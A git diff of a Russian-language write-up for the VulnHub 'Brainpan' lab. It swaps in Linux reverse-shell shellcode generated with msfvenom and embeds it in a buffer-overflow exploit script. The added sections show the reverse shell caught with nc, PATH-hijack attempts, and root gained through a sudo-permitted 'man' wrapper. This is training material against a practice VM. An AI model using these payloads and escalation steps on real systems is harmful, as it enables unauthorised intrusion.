@@ -330,71 +330,27 @@ io.interactive()
 Сравниваю в **mona** `!mona compare -f "c:\mona\brainpan\bytearray.bin" -a 0022F930`  
 <img width="449" height="371" alt="image" src="https://github.com/user-attachments/assets/0b4a9e05-fc50-42d4-b5c3-a188fed80f64" />
 
-Получается, что кроме '\x00' badchars отсутствуют, так что генерирую reverse shell, который помещу в стек.
+Получается, что кроме '\x00' badchars отсутствуют, так что генерирую reverse shell, но уже для виртуальной машины с лабораторной, который помещу в стек.
 ```bash
 ┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
-└─$ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.56.106 LPORT=4444 -f py -e x86/shikata_ga_nai -b "\x00" -v stack
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.106 LPORT=4444 -f py -e x86/shikata_ga_nai -b "\x00" -v stack
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 381 (iteration=0)
-x86/shikata_ga_nai chosen with final size 381
-Payload size: 381 bytes
-Final size of py file: 1953 bytes
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of py file: 497 bytes
 stack =  b""
-stack += b"\xba\xa0\x7e\xfb\x34\xd9\xe5\xd9\x74\x24\xf4\x5f"
-stack += b"\x31\xc9\xb1\x59\x83\xef\xfc\x31\x57\x10\x03\x57"
-stack += b"\x10\x42\x8b\x07\xdc\x0d\x74\xf8\x1d\x71\x44\x2a"
-stack += b"\x79\xfa\xf4\xfa\x0b\x19\x73\xa8\x07\x6a\xd6\x59"
-stack += b"\x17\xdb\x9d\x47\x16\xdc\xa9\xfa\x70\x13\x6e\x56"
-stack += b"\xbc\x32\x12\xa5\x91\x94\x2b\x66\xe4\xd5\x6c\x30"
-stack += b"\x82\x3a\x20\x48\x3e\xd4\x92\xc5\xfd\xe8\x1d\x0a"
-stack += b"\x8a\x50\x66\x2f\x4d\x24\xda\x2e\x9e\x4f\xba\x10"
-stack += b"\x4e\xc4\x73\x49\x6f\x09\x06\xa0\x1b\x91\x40\xb8"
-stack += b"\xd0\x62\x63\x41\x19\xa2\xb5\x7d\xb6\x8b\x79\x70"
-stack += b"\xc6\xcc\xbe\x6b\xbd\x26\xbd\x16\xc6\xfd\xbf\xcc"
-stack += b"\x43\xe1\x18\x86\xf4\xc5\x99\x4b\x62\x8e\x96\x20"
-stack += b"\xe0\xc8\xba\xb7\x25\x63\xc6\x3c\xc8\xa3\x4e\x06"
-stack += b"\xef\x67\x0a\xdc\x8e\x3e\xf6\xb3\xaf\x20\x5e\x6b"
-stack += b"\x0a\x2b\x4d\x7a\x2a\xd4\x8d\x83\x76\x42\x41\x4e"
-stack += b"\x89\x92\xcd\xd9\xfa\xa0\x52\x72\x95\x88\x1b\x5c"
-stack += b"\x62\x99\x0c\x5f\xbc\x21\x5c\xa1\x3d\x51\x74\x66"
-stack += b"\x69\x01\xee\x4f\x12\xca\xee\x70\xc7\x66\xe5\xe6"
-stack += b"\x28\xde\xc1\x9c\xc0\x1c\x32\x70\x4d\xa9\xd4\x22"
-stack += b"\x3d\xf9\x48\x83\xed\xb9\x38\x6b\xe4\x36\x66\x8b"
-stack += b"\x07\x9d\x0f\x26\xe8\x4b\x67\xdf\x91\xd6\xf3\x7e"
-stack += b"\x5d\xcd\x79\x40\xd5\xe7\x7e\x0f\x1e\x82\x6c\x78"
-stack += b"\x79\x6c\x6d\x79\xec\x6c\x07\x7d\xa6\x3b\xbf\x7f"
-stack += b"\x9f\x0b\x60\x7f\xca\x08\x67\x7f\x8b\x38\x13\xb6"
-stack += b"\x19\x04\x4b\xb7\xcd\x84\x8b\xe1\x87\x84\xe3\x55"
-stack += b"\xfc\xd7\x16\x9a\x29\x44\x8b\x0f\xd2\x3c\x7f\x87"
-stack += b"\xba\xc2\xa6\xef\x64\x3d\x8d\x73\x62\xc1\x53\x5c"
-stack += b"\xcb\xa9\xab\xdc\xeb\x29\xc6\xdc\xbb\x41\x1d\xf2"
-stack += b"\x34\xa1\xde\xd9\x1c\xa9\x55\x8c\xef\x48\x69\x85"
-stack += b"\xae\xd4\x6a\x2a\x6b\xe7\x11\x43\x8c\x08\xe6\x4d"
-stack += b"\xe9\x09\xe6\x71\x0f\x36\x30\x48\x65\x79\x80\xef"
-stack += b"\x76\xcc\xa5\x46\x1d\x2e\xf9\x99\x34"
-```
-
-Запускаю multi/handler
-```bash
-msf6 exploit(multi/handler) > options
-
-Payload options (windows/shell/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     192.168.56.106   yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Wildcard Target
+stack += b"\xb8\xbe\x8f\x37\x5e\xd9\xcb\xd9\x74\x24\xf4\x5f"
+stack += b"\x33\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e\x03\xf9"
+stack += b"\x81\xd5\xab\x34\x45\xee\xb7\x65\x3a\x42\x52\x8b"
+stack += b"\x35\x85\x12\xed\x88\xc6\xc0\xa8\xa2\xf8\x2b\xca"
+stack += b"\x8a\x7f\x4d\xa2\xcc\x28\x95\x58\xa5\x2a\xe6\x8d"
+stack += b"\x69\xa2\x07\x1d\xf7\xe4\x96\x0e\x4b\x07\x90\x51"
+stack += b"\x66\x88\xf0\xf9\x17\xa6\x87\x91\x8f\x97\x48\x03"
+stack += b"\x39\x61\x75\x91\xea\xf8\x9b\xa5\x06\x36\xdb"
 ```
 
 Устанавливаю **EIP** на адрес инструкции `jmp esp` (**0x311712f3**).  
@@ -420,38 +376,14 @@ EIP     = p32(0x311712f3)
 nop     = b'\x90'*8
 
 stack =  b""
-stack += b"\xba\xa0\x7e\xfb\x34\xd9\xe5\xd9\x74\x24\xf4\x5f"
-stack += b"\x31\xc9\xb1\x59\x83\xef\xfc\x31\x57\x10\x03\x57"
-stack += b"\x10\x42\x8b\x07\xdc\x0d\x74\xf8\x1d\x71\x44\x2a"
-stack += b"\x79\xfa\xf4\xfa\x0b\x19\x73\xa8\x07\x6a\xd6\x59"
-stack += b"\x17\xdb\x9d\x47\x16\xdc\xa9\xfa\x70\x13\x6e\x56"
-stack += b"\xbc\x32\x12\xa5\x91\x94\x2b\x66\xe4\xd5\x6c\x30"
-stack += b"\x82\x3a\x20\x48\x3e\xd4\x92\xc5\xfd\xe8\x1d\x0a"
-stack += b"\x8a\x50\x66\x2f\x4d\x24\xda\x2e\x9e\x4f\xba\x10"
-stack += b"\x4e\xc4\x73\x49\x6f\x09\x06\xa0\x1b\x91\x40\xb8"
-stack += b"\xd0\x62\x63\x41\x19\xa2\xb5\x7d\xb6\x8b\x79\x70"
-stack += b"\xc6\xcc\xbe\x6b\xbd\x26\xbd\x16\xc6\xfd\xbf\xcc"
-stack += b"\x43\xe1\x18\x86\xf4\xc5\x99\x4b\x62\x8e\x96\x20"
-stack += b"\xe0\xc8\xba\xb7\x25\x63\xc6\x3c\xc8\xa3\x4e\x06"
-stack += b"\xef\x67\x0a\xdc\x8e\x3e\xf6\xb3\xaf\x20\x5e\x6b"
-stack += b"\x0a\x2b\x4d\x7a\x2a\xd4\x8d\x83\x76\x42\x41\x4e"
-stack += b"\x89\x92\xcd\xd9\xfa\xa0\x52\x72\x95\x88\x1b\x5c"
-stack += b"\x62\x99\x0c\x5f\xbc\x21\x5c\xa1\x3d\x51\x74\x66"
-stack += b"\x69\x01\xee\x4f\x12\xca\xee\x70\xc7\x66\xe5\xe6"
-stack += b"\x28\xde\xc1\x9c\xc0\x1c\x32\x70\x4d\xa9\xd4\x22"
-stack += b"\x3d\xf9\x48\x83\xed\xb9\x38\x6b\xe4\x36\x66\x8b"
-stack += b"\x07\x9d\x0f\x26\xe8\x4b\x67\xdf\x91\xd6\xf3\x7e"
-stack += b"\x5d\xcd\x79\x40\xd5\xe7\x7e\x0f\x1e\x82\x6c\x78"
-stack += b"\x79\x6c\x6d\x79\xec\x6c\x07\x7d\xa6\x3b\xbf\x7f"
-stack += b"\x9f\x0b\x60\x7f\xca\x08\x67\x7f\x8b\x38\x13\xb6"
-stack += b"\x19\x04\x4b\xb7\xcd\x84\x8b\xe1\x87\x84\xe3\x55"
-stack += b"\xfc\xd7\x16\x9a\x29\x44\x8b\x0f\xd2\x3c\x7f\x87"
-stack += b"\xba\xc2\xa6\xef\x64\x3d\x8d\x73\x62\xc1\x53\x5c"
-stack += b"\xcb\xa9\xab\xdc\xeb\x29\xc6\xdc\xbb\x41\x1d\xf2"
-stack += b"\x34\xa1\xde\xd9\x1c\xa9\x55\x8c\xef\x48\x69\x85"
-stack += b"\xae\xd4\x6a\x2a\x6b\xe7\x11\x43\x8c\x08\xe6\x4d"
-stack += b"\xe9\x09\xe6\x71\x0f\x36\x30\x48\x65\x79\x80\xef"
-stack += b"\x76\xcc\xa5\x46\x1d\x2e\xf9\x99\x34"
+stack += b"\xb8\xbe\x8f\x37\x5e\xd9\xcb\xd9\x74\x24\xf4\x5f"
+stack += b"\x33\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e\x03\xf9"
+stack += b"\x81\xd5\xab\x34\x45\xee\xb7\x65\x3a\x42\x52\x8b"
+stack += b"\x35\x85\x12\xed\x88\xc6\xc0\xa8\xa2\xf8\x2b\xca"
+stack += b"\x8a\x7f\x4d\xa2\xcc\x28\x95\x58\xa5\x2a\xe6\x8d"
+stack += b"\x69\xa2\x07\x1d\xf7\xe4\x96\x0e\x4b\x07\x90\x51"
+stack += b"\x66\x88\xf0\xf9\x17\xa6\x87\x91\x8f\x97\x48\x03"
+stack += b"\x39\x61\x75\x91\xea\xf8\x9b\xa5\x06\x36\xdb"
 
 payload = b''.join([
     junk,
@@ -469,41 +401,272 @@ io.sendline(payload)
 io.interactive()
 ```
 
-И запускаю его, не забыв поменять HOST для выполнения атаки не на запущенное приложение brainpan.exe в immunity debugger на моей виртуальной машине, а на виртуальную машину с лабораторной
+
+## 📂 Получение доступа
+
+Запускаю listener
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
+└─$ nc -lvnp 4444         
+listening on [any] 4444 ...
+```
+
+И запускаю скрипт, не забыв поменять HOST для выполнения атаки не на запущенное приложение brainpan.exe в immunity debugger на моей виртуальной машине, а на виртуальную машину с лабораторной
 ```bash
 python3 x.py HOST=192.168.56.123
 ```
 
+Получаю reverse shell
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
+└─$ nc -lvnp 4444         
+listening on [any] 4444 ...
+connect to [192.168.56.106] from (UNKNOWN) [192.168.56.123] 55484
+whoami
+puck
+pwd
+/home/puck
+which python3
+/usr/bin/python3
+which bash
+/bin/bash
+```
 
-## 📂 Получение доступа
+И немного улучшаю оболочку с помощью **python**
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 
-
+Осматриваюсь
+```bash
+puck@brainpan:/home/puck$ ls -la
+ls -la
+total 48
+drwx------ 7 puck puck 4096 Mar  6  2013 .
+drwxr-xr-x 5 root root 4096 Mar  4  2013 ..
+-rw------- 1 puck puck    0 Mar  5  2013 .bash_history
+-rw-r--r-- 1 puck puck  220 Mar  4  2013 .bash_logout
+-rw-r--r-- 1 puck puck 3637 Mar  4  2013 .bashrc
+drwx------ 3 puck puck 4096 Mar  4  2013 .cache
+drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .config
+-rw------- 1 puck puck   55 Mar  5  2013 .lesshst
+drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .local
+-rw-r--r-- 1 puck puck  675 Mar  4  2013 .profile
+drwxrwxr-x 4 puck puck 4096 Jul 19 18:22 .wine
+-rwxr-xr-x 1 root root  513 Mar  6  2013 checksrv.sh
+drwxrwxr-x 3 puck puck 4096 Mar  4  2013 web
+puck@brainpan:/home/puck$ id
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+puck@brainpan:/home/puck$ ls -la /home
+ls -la /home
+total 20
+drwxr-xr-x  5 root    root    4096 Mar  4  2013 .
+drwxr-xr-x 22 root    root    4096 Mar  4  2013 ..
+drwx------  4 anansi  anansi  4096 Mar  4  2013 anansi
+drwx------  7 puck    puck    4096 Mar  6  2013 puck
+drwx------  3 reynard reynard 4096 Mar  4  2013 reynard
+```
 
 ## ⚙️ Привилегии
 
+Есть `sudo -l`
+```bash
+puck@brainpan:/home/puck$ sudo -l
+sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+```
+
+Запускаю `sudo /home/anansi/bin/anansi_util`
+```bash
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
+sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+```
+
+И пробую action `network`
+```bash
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
+sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+```
+
+При этом, похоже, выполняется команда `ip a`
+```bash
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network
+sudo /home/anansi/bin/anansi_util network
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
+    link/ether 08:00:27:08:2c:9b brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.123/24 brd 192.168.56.255 scope global eth0
+    inet6 fe80::a00:27ff:fe08:2c9b/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+Проверил на уязвимость $PATH для `ip`
+```bash
+puck@brainpan:/home/puck$ echo '/bin/sh' > /tmp/ip
+echo '/bin/sh' > /tmp/ip
+puck@brainpan:/home/puck$ chmod +x /tmp/ip
+chmod +x /tmp/ip
+puck@brainpan:/home/puck$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+puck@brainpan:/home/puck$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network
+sudo /home/anansi/bin/anansi_util network
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
+    link/ether 08:00:27:08:2c:9b brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.123/24 brd 192.168.56.255 scope global eth0
+    inet6 fe80::a00:27ff:fe08:2c9b/64 scope link 
+       valid_lft forever preferred_lft forever
+```
 
 
-## 🏁 Флаги
+Следующая команда выполняет команду `top`, но нужно немного помочь
+```bash
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
+sudo /home/anansi/bin/anansi_util proclist
+'unknown': unknown terminal type.
+puck@brainpan:/home/puck$ export TERM=xterm
+export TERM=xterm
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
+sudo /home/anansi/bin/anansi_util proclist
+top - 18:57:50 up  1:54,  0 users,  load average: 0.00, 0.01, 0.04
+Tasks:  87 total,   1 running,  86 sleeping,   0 stopped,   0 zombie
+%Cpu(s):  0.0 us,  0.1 sy,  0.0 ni, 99.5 id,  0.3 wa,  0.0 hi,  0.0 si,  0.0 st
+KiB Mem:    248936 total,   241828 used,     7108 free,    27472 buffers
+KiB Swap:   520188 total,        0 used,   520188 free,   161204 cached
 
-- User flag: 
-- Root flag: 
+  PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND           
+    1 root      20   0  3496 1880 1296 S   0.0  0.8   0:00.33 init              
+    2 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kthreadd          
+    3 root      20   0     0    0    0 S   0.0  0.0   0:01.15 ksoftirqd/0       
+    4 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kworker/0:0       
+    6 root      rt   0     0    0    0 S   0.0  0.0   0:00.00 migration/0       
+    7 root      rt   0     0    0    0 S   0.0  0.0   0:00.19 watchdog/0        
+    8 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 cpuset            
+    9 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 khelper           
+   10 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kdevtmpfs         
+   11 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 netns             
+   12 root      20   0     0    0    0 S   0.0  0.0   0:00.08 sync_supers       
+   13 root      20   0     0    0    0 S   0.0  0.0   0:00.00 bdi-default       
+   14 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kintegrityd       
+   15 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kblockd           
+   16 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 ata_sff           
+   17 root      20   0     0    0    0 S   0.0  0.0   0:00.00 khubd             
+   18 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 md
+```
 
----
+Проверил на уязвимость $PATH для `top`
+```bash
+puck@brainpan:/home/puck$ echo '/bin/sh' > /tmp/top
+echo '/bin/sh' > /tmp/top
+puck@brainpan:/home/puck$ chmod +x /tmp/top
+chmod +x /tmp/top
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
+sudo /home/anansi/bin/anansi_util proclist
+top - 19:45:20 up  2:41,  0 users,  load average: 0.00, 0.01, 0.05
+Tasks:  97 total,   1 running,  96 sleeping,   0 stopped,   0 zombie
+%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.2 id,  0.4 wa,  0.0 hi,  0.1 si,  0.0 st
+KiB Mem:    248936 total,   237392 used,    11544 free,    41464 buffers
+KiB Swap:   520188 total,       48 used,   520140 free,    84756 cached
 
-## 📋 Резюме
+  PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND           
+    1 root      20   0  3496 1832 1296 S   0.0  0.7   0:00.34 init              
+    2 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kthreadd          
+    3 root      20   0     0    0    0 S   0.0  0.0   0:01.90 ksoftirqd/0       
+    4 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kworker/0:0       
+    6 root      rt   0     0    0    0 S   0.0  0.0   0:00.00 migration/0       
+    7 root      rt   0     0    0    0 S   0.0  0.0   0:00.27 watchdog/0        
+    8 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 cpuset            
+    9 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 khelper           
+   10 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kdevtmpfs         
+   11 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 netns             
+   12 root      20   0     0    0    0 S   0.0  0.0   0:00.12 sync_supers       
+   13 root      20   0     0    0    0 S   0.0  0.0   0:00.00 bdi-default       
+   14 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kintegrityd       
+   15 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kblockd           
+   16 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 ata_sff           
+   17 root      20   0     0    0    0 S   0.0  0.0   0:00.00 khubd             
+   18 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 md                
 
-🧰 **Инструменты:**
-  - nmap, ffuf, и др.
+puck@brainpan:/home/puck$ 
+```
 
-🚨 **Уязвимости, которые удалось обнаружить:**  
-  - Directory Traversal  
-  - RCE через уязвимый скрипт  
+Следующая команда выполняет команду `man` и передает ей параметр
+```bash
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls
+sudo /home/anansi/bin/anansi_util manual ls
+```
 
-🛡 **Советы по защите:**
-  - Использовать сложные пароли и ограничить число попыток входа
-  - Обновлять ПО до актуальных версий
-  - Удалять/ограничивать использование SUID-бинарников
-  - Настроить логирование и мониторинг системных событий
-  - Применять принцип наименьших привилегий
+Это можно использовать для повышения привилегий  
+<img width="832" height="189" alt="image" src="https://github.com/user-attachments/assets/ecd98ab4-72f3-46a6-b9eb-7e194863bb68" />  
+
+Получаю `root`
+```bash
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man
+sudo /home/anansi/bin/anansi_util manual man
+No manual entry for manual
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@brainpan:/usr/share/man#
+root@brainpan:/home/anansi# cd /root
+cd /root
+root@brainpan:~# ls -la
+ls -la
+total 40
+drwx------  5 root root 4096 Mar  7  2013 .
+drwxr-xr-x 22 root root 4096 Mar  4  2013 ..
+drwx------  2 root root 4096 Mar  4  2013 .aptitude
+-rw-------  1 root root    0 Mar  7  2013 .bash_history
+-rw-r--r--  1 root root 3106 Jul  3  2012 .bashrc
+-rw-r--r--  1 root root  564 Mar  7  2013 b.txt
+drwx------  2 root root 4096 Mar  4  2013 .cache
+-rw-------  1 root root   39 Mar  5  2013 .lesshst
+-rw-r--r--  1 root root  140 Jul  3  2012 .profile
+-rw-r--r--  1 root root   74 Mar  5  2013 .selected_editor
+drwx------  2 root root 4096 Mar  4  2013 .ssh
+root@brainpan:~# cat b.txt
+cat b.txt
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
 
 
+                                              http://www.techorganic.com 
+
+
+
+root@brainpan:~# 
+```
